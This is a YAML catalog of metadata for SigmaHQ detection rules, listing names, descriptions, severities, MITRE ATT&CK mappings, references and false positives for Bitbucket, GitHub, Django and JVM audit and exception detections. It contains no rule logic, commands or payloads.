source_id: sigmahq_sigma
generated_at: '2026-01-16T17:51:40Z'
counts:
  total_rules_discovered: 3667
  records_written: 3667
  skipped: 0
records:
- detection_id: 195e1b9d-bfc2-4ffa-ab4e-35aef69815f8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_full_data_export_triggered.yml
  name: Bitbucket Full Data Export Triggered
  description: Detects when full data export is attempted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1213.003
  tags:
  - attack.collection
  - attack.t1213.003
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/adminjiraserver0811/importing-and-exporting-data-1019391889.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: aac6c4f4-87c7-4961-96ac-c3fd3a42c310
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_global_permissions_change_detected.yml
  name: Bitbucket Global Permission Changed
  description: Detects global permissions change activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1098
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1098
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/bitbucketserver/global-permissions-776640369.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: e16cf0f0-ee88-4901-bd0b-4c8d13d9ee05
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_global_secret_scanning_rule_deleted.yml
  name: Bitbucket Global Secret Scanning Rule Deleted
  description: Detects Bitbucket global secret scanning rule deletion activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/bitbucketserver/secret-scanning-1157471613.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: 16ab6143-510a-44e2-a615-bdb80b8317fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_global_ssh_settings_change_detected.yml
  name: Bitbucket Global SSH Settings Changed
  description: Detects Bitbucket global SSH access configuration changes.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.004
  - T1562.001
  tags:
  - attack.lateral-movement
  - attack.defense-evasion
  - attack.t1562.001
  - attack.t1021.004
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/bitbucketserver/enable-ssh-access-to-git-repositories-776640358.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: 6aa12161-235a-4dfb-9c74-fe08df8d8da1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_log_configuration_update_detected.yml
  name: Bitbucket Audit Log Configuration Updated
  description: Detects changes to the bitbucket audit log configuration.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/view-and-configure-the-audit-log-776640417.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: 42ccce6d-7bd3-4930-95cd-e4d83fa94a30
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_project_secret_scanning_allowlist_added.yml
  name: Bitbucket Project Secret Scanning Allowlist Added
  description: Detects when a secret scanning allowlist rule is added for projects.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/bitbucketserver/secret-scanning-1157471613.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: b91e8d5e-0033-44fe-973f-b730316f23a1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_secret_scanning_exempt_repository_detected.yml
  name: Bitbucket Secret Scanning Exempt Repository Added
  description: Detects when a repository is exempted from secret scanning feature.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/bitbucketserver/secret-scanning-1157471613.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: ff91e3f0-ad15-459f-9a85-1556390c138d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_secret_scanning_rule_deleted.yml
  name: Bitbucket Secret Scanning Rule Deleted
  description: Detects when secret scanning rule is deleted for the project or repository.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/bitbucketserver/secret-scanning-1157471613.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: 7215374a-de4f-4b33-8ba5-70804c9251d3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_unauthorized_access_detected.yml
  name: Bitbucket Unauthorized Access To A Resource
  description: Detects unauthorized access attempts to a resource.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1586
  tags:
  - attack.resource-development
  - attack.t1586
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  false_positives:
  - Access attempts to non-existent repositories or due to outdated plugins. Usually
    "Anonymous" user is reported in the "author.name" field in most cases.
  notes: ''
- detection_id: 34d81081-03c9-4a7f-91c9-5e46af625cde
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_unauthorized_full_data_export_triggered.yml
  name: Bitbucket Unauthorized Full Data Export Triggered
  description: Detects when full data export is attempted an unauthorized user.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1213.003
  - T1586
  tags:
  - attack.collection
  - attack.resource-development
  - attack.t1213.003
  - attack.t1586
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/bitbucketserver/secret-scanning-1157471613.html
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5259cbf2-0a75-48bf-b57a-c54d6fabaef3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_user_details_export_attempt_detected.yml
  name: Bitbucket User Details Export Attempt Detected
  description: Detects user data export activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Discovery
  - Reconnaissance
  techniques:
  - T1082
  - T1213
  - T1591.004
  tags:
  - attack.collection
  - attack.reconnaissance
  - attack.discovery
  - attack.t1213
  - attack.t1082
  - attack.t1591.004
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://support.atlassian.com/security-and-access-policies/docs/export-user-accounts
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: 70ed1d26-0050-4b38-a599-92c53d57d45a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_user_login_failure_detected.yml
  name: Bitbucket User Login Failure
  description: 'Detects user authentication failure events.

    Please note that this rule can be noisy and it is recommended to use with correlation
    based on "author.name" field.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 7
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - multi_signal_correlation
  severity: medium
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  - T1110
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.initial-access
  - attack.defense-evasion
  - attack.credential-access
  - attack.t1078.004
  - attack.t1110
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  false_positives:
  - Legitimate user wrong password attempts.
  notes: ''
- detection_id: d3f90469-fb05-42ce-b67d-0fded91bbef3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_user_login_failure_via_ssh_detected.yml
  name: Bitbucket User Login Failure Via SSH
  description: 'Detects SSH user login access failures.

    Please note that this rule can be noisy and is recommended to use with correlation
    based on "author.name" field.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 9
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - multi_signal_correlation
  - repeated_or_escalation_behavior
  severity: medium
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1021.004
  - T1110
  tags:
  - attack.lateral-movement
  - attack.credential-access
  - attack.t1021.004
  - attack.t1110
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/view-and-configure-the-audit-log-776640417.html
  - https://confluence.atlassian.com/bitbucketserver/enable-ssh-access-to-git-repositories-776640358.html
  false_positives:
  - Legitimate user wrong password attempts.
  notes: ''
- detection_id: 87cc6698-3e07-4ba2-9b43-a85a73e151e2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/bitbucket/audit/bitbucket_audit_user_permissions_export_attempt_detected.yml
  name: Bitbucket User Permissions Export Attempt
  description: Detects user permission data export attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: bitbucket
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Discovery
  - Reconnaissance
  techniques:
  - T1082
  - T1213
  - T1591.004
  tags:
  - attack.reconnaissance
  - attack.collection
  - attack.discovery
  - attack.t1213
  - attack.t1082
  - attack.t1591.004
  time_window: ''
  references:
  - https://confluence.atlassian.com/bitbucketserver/audit-log-events-776640423.html
  - https://confluence.atlassian.com/bitbucketserver/users-and-groups-776640439.html
  false_positives:
  - Legitimate user activity.
  notes: ''
- detection_id: fd435618-981e-4a7c-81f8-f78ce480d616
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/django/appframework_django_exceptions.yml
  name: Django Framework Exceptions
  description: Detects suspicious Django web application framework exceptions that
    could indicate exploitation attempts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: stable
  platform: django
  product: django
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://docs.djangoproject.com/en/1.11/ref/exceptions/
  - https://docs.djangoproject.com/en/1.11/topics/logging/#django-security
  false_positives:
  - Application bugs
  notes: ''
- detection_id: 16a71777-0b2e-4db7-9888-9d59cb75200b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_delete_action_invoked.yml
  name: Github Delete Action Invoked
  description: Detects delete action in the Github audit logs for codespaces, environment,
    project and repo.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Impact
  techniques:
  - T1213.003
  tags:
  - attack.impact
  - attack.collection
  - attack.t1213.003
  time_window: ''
  references:
  - https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/reviewing-the-audit-log-for-your-organization#audit-log-actions
  false_positives:
  - Validate the deletion activity is permitted. The "actor" field need to be validated.
  notes: ''
- detection_id: 8622c92d-c00e-463c-b09d-fd06166f6794
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_disable_high_risk_configuration.yml
  name: Github High Risk Configuration Disabled
  description: Detects when a user disables a critical security feature for an organization.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1556
  tags:
  - attack.credential-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1556
  time_window: ''
  references:
  - https://docs.github.com/en/organizations/managing-oauth-access-to-your-organizations-data/disabling-oauth-app-access-restrictions-for-your-organization
  - https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/reviewing-the-audit-log-for-your-organization#dependabot_alerts-category-actions
  - https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-security-and-analysis-settings-for-your-repository
  - https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/audit-log-events-for-your-enterprise
  false_positives:
  - Approved administrator/owner activities.
  notes: ''
- detection_id: 34e1c7d4-0cd5-419d-9f1b-1dad3f61018d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_disabled_outdated_dependency_or_vulnerability.yml
  name: Outdated Dependency Or Vulnerability Alert Disabled
  description: 'Dependabot performs a scan to detect insecure dependencies, and sends
    Dependabot alerts.

    This rule detects when an organization owner disables Dependabot alerts private
    repositories or Dependabot security updates for all repositories.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1195.001
  tags:
  - attack.initial-access
  - attack.t1195.001
  time_window: ''
  references:
  - https://docs.github.com/en/code-security/dependabot/dependabot-alerts/about-dependabot-alerts
  - https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/managing-security-and-analysis-settings-for-your-organization
  false_positives:
  - Approved changes by the Organization owner. Please validate the 'actor' if authorized
    to make the changes.
  notes: ''
- detection_id: 69b3bd1e-b38a-462f-9a23-fbdbf63d2294
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_fork_private_repos_enabled_or_cleared.yml
  name: Github Fork Private Repositories Setting Enabled/Cleared
  description: 'Detects when the policy allowing forks of private and internal repositories
    is changed (enabled or cleared).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  - Persistence
  techniques:
  - T1020
  - T1537
  tags:
  - attack.persistence
  - attack.exfiltration
  - attack.t1020
  - attack.t1537
  time_window: ''
  references:
  - https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/audit-log-events-for-your-enterprise#private_repository_forking
  false_positives:
  - Allowed administrative activities.
  notes: ''
- detection_id: 3908d64a-3c06-4091-b503-b3a94424533b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_new_org_member.yml
  name: New Github Organization Member Added
  description: Detects when a new member is added or invited to a github organization.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: informational
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136.003
  tags:
  - attack.persistence
  - attack.t1136.003
  time_window: ''
  references:
  - https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/reviewing-the-audit-log-for-your-organization#dependabot_alerts-category-actions
  false_positives:
  - Organization approved new members
  notes: ''
- detection_id: f9405037-bc97-4eb7-baba-167dad399b83
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_new_secret_created.yml
  name: Github New Secret Created
  description: Detects when a user creates action secret for the organization, environment,
    codespaces or repository.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.initial-access
  - attack.t1078.004
  time_window: ''
  references:
  - https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/reviewing-the-audit-log-for-your-organization#audit-log-actions
  false_positives:
  - This detection cloud be noisy depending on the environment. It is recommended
    to keep a check on the new secrets when created and validate the "actor".
  notes: ''
- detection_id: eaa9ac35-1730-441f-9587-25767bde99d7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_outside_collaborator_detected.yml
  name: Github Outside Collaborator Detected
  description: 'Detects when an organization member or an outside collaborator is
    added to or removed from a project board or has their permission level changed
    or when an owner removes an outside collaborator from an organization or when
    two-factor authentication is required in an organization and an outside collaborator
    does not use 2FA or disables 2FA.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: medium
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Persistence
  techniques:
  - T1098.001
  - T1098.003
  - T1213.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.collection
  - attack.t1098.001
  - attack.t1098.003
  - attack.t1213.003
  time_window: ''
  references:
  - https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/reviewing-the-audit-log-for-your-organization#audit-log-actions
  - https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-two-factor-authentication-for-your-organization/requiring-two-factor-authentication-in-your-organization
  false_positives:
  - Validate the actor if permitted to access the repo.
  - Validate the Multifactor Authentication changes.
  notes: ''
- detection_id: 0c46d4f4-a2bf-4104-9597-8d653fc2bb55
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_pages_site_changed_to_public.yml
  name: GitHub Repository Pages Site Changed to Public
  description: 'Detects when a GitHub Pages site of a repository is made public. This
    usually is part of a publishing process but could indicate or lead to potential
    unauthorized exposure of sensitive information or code.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: experimental
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Exfiltration
  techniques:
  - T1567.001
  tags:
  - attack.collection
  - attack.exfiltration
  - attack.t1567.001
  time_window: ''
  references:
  - https://docs.github.com/en/pages/getting-started-with-github-pages/creating-a-github-pages-site
  - https://www.sentinelone.com/blog/exploiting-repos-6-ways-threat-actors-abuse-github-other-devops-platforms
  - https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/security-log-events
  false_positives:
  - Legitimate publishing of repository pages by authorized users
  notes: ''
- detection_id: 02cf536a-cf21-4876-8842-4159c8aee3cc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_push_protection_bypass_detected.yml
  name: Github Push Protection Bypass Detected
  description: Detects when a user bypasses the push protection on a secret detected
    by secret scanning.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://docs.github.com/en/enterprise-cloud@latest/code-security/secret-scanning/push-protection-for-repositories-and-organizations
  - https://thehackernews.com/2024/03/github-rolls-out-default-secret.html
  false_positives:
  - Allowed administrative activities.
  notes: ''
- detection_id: ccd55945-badd-4bae-936b-823a735d37dd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_push_protection_disabled.yml
  name: Github Push Protection Disabled
  description: Detects if the push protection feature is disabled for an organization,
    enterprise, repositories or custom pattern rules.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://docs.github.com/en/enterprise-cloud@latest/code-security/secret-scanning/push-protection-for-repositories-and-organizations
  - https://thehackernews.com/2024/03/github-rolls-out-default-secret.html
  false_positives:
  - Allowed administrative activities.
  notes: ''
- detection_id: 04ad83ef-1a37-4c10-b57a-81092164bf33
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_repo_or_org_transferred.yml
  name: Github Repository/Organization Transferred
  description: Detects when a repository or an organization is being transferred to
    another location.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  - Persistence
  techniques:
  - T1020
  - T1537
  tags:
  - attack.persistence
  - attack.exfiltration
  - attack.t1020
  - attack.t1537
  time_window: ''
  references:
  - https://docs.github.com/en/repositories/creating-and-managing-repositories/transferring-a-repository
  - https://docs.github.com/en/organizations/managing-organization-settings/transferring-organization-ownership
  - https://docs.github.com/en/migrations
  - https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/audit-log-events-for-your-enterprise#migration
  false_positives:
  - Allowed administrative activities.
  notes: ''
- detection_id: dca8991c-cb16-4128-abf8-6b11e5cd156f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_repository_archive_status_changed.yml
  name: GitHub Repository Archive Status Changed
  description: 'Detects when a GitHub repository is archived or unarchived, which
    may indicate unauthorized changes to repository status.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: experimental
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Impact
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.impact
  time_window: ''
  references:
  - https://docs.github.com/en/repositories/archiving-a-github-repository/archiving-repositories
  - https://www.sentinelone.com/blog/exploiting-repos-6-ways-threat-actors-abuse-github-other-devops-platforms
  - https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/security-log-events
  false_positives:
  - Archiving or unarchiving a repository is often legitimate. Investigate this action
    to determine if it was authorized.
  notes: ''
- detection_id: 3883d9a0-fd0f-440f-afbb-445a2a799bb8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_secret_scanning_feature_disabled.yml
  name: Github Secret Scanning Feature Disabled
  description: Detects if the secret scanning feature is disabled for an enterprise
    or repository.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://docs.github.com/en/enterprise-cloud@latest/code-security/secret-scanning/about-secret-scanning
  false_positives:
  - Allowed administrative activities.
  notes: ''
- detection_id: f8ed0e8f-7438-4b79-85eb-f358ef2fbebd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_self_hosted_runner_changes_detected.yml
  name: Github Self Hosted Runner Changes Detected
  description: 'A self-hosted runner is a system that you deploy and manage to execute
    jobs from GitHub Actions on GitHub.com.

    This rule detects changes to self-hosted runners configurations in the environment.
    The self-hosted runner configuration changes once detected,

    it should be validated from GitHub UI because the log entry may not provide full
    context.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Collection
  - Discovery
  - Impact
  - Persistence
  techniques:
  - T1078.004
  - T1213.003
  - T1526
  tags:
  - attack.impact
  - attack.discovery
  - attack.collection
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.initial-access
  - attack.t1526
  - attack.t1213.003
  - attack.t1078.004
  time_window: ''
  references:
  - https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners#about-self-hosted-runners
  - https://docs.github.com/en/organizations/keeping-your-organization-secure/managing-security-settings-for-your-organization/reviewing-the-audit-log-for-your-organization#search-based-on-operation
  false_positives:
  - Allowed self-hosted runners changes in the environment.
  - A self-hosted runner is automatically removed from GitHub if it has not connected
    to GitHub Actions for more than 14 days.
  - An ephemeral self-hosted runner is automatically removed from GitHub if it has
    not connected to GitHub Actions for more than 1 day.
  notes: ''
- detection_id: 2f575940-d85e-4ddc-af13-17dad6f1a0ef
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/github/audit/github_ssh_certificate_config_changed.yml
  name: Github SSH Certificate Configuration Changed
  description: Detects when changes are made to the SSH certificate configuration
    of the organization.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: github
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078.004
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1078.004
  time_window: ''
  references:
  - https://docs.github.com/en/enterprise-cloud@latest/organizations/managing-git-access-to-your-organizations-repositories/about-ssh-certificate-authorities
  - https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/audit-log-events-for-your-enterprise#ssh_certificate_authority
  false_positives:
  - Allowed administrative activities.
  notes: ''
- detection_id: bb0e9cec-d4da-46f5-997f-22efc59f3dca
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/jvm/java_jndi_injection_exploitation_attempt.yml
  name: Potential JNDI Injection Exploitation In JVM Based Application
  description: Detects potential JNDI Injection exploitation. Often coupled with Log4Shell
    exploitation.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: jvm
  product: jvm
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.wix.engineering/post/threat-and-vulnerability-hunting-with-application-server-error-logs
  - https://secariolabs.com/research/analysing-and-reproducing-poc-for-log4j-2-15-0
  false_positives:
  - Application bugs
  notes: ''
- detection_id: e032f5bc-4563-4096-ae3b-064bab588685
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/jvm/java_local_file_read.yml
  name: Potential Local File Read Vulnerability In JVM Based Application
  description: 'Detects potential local file read vulnerability in JVM based apps.

    If the exceptions are caused due to user input and contain path traversal payloads
    then it''s a red flag.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
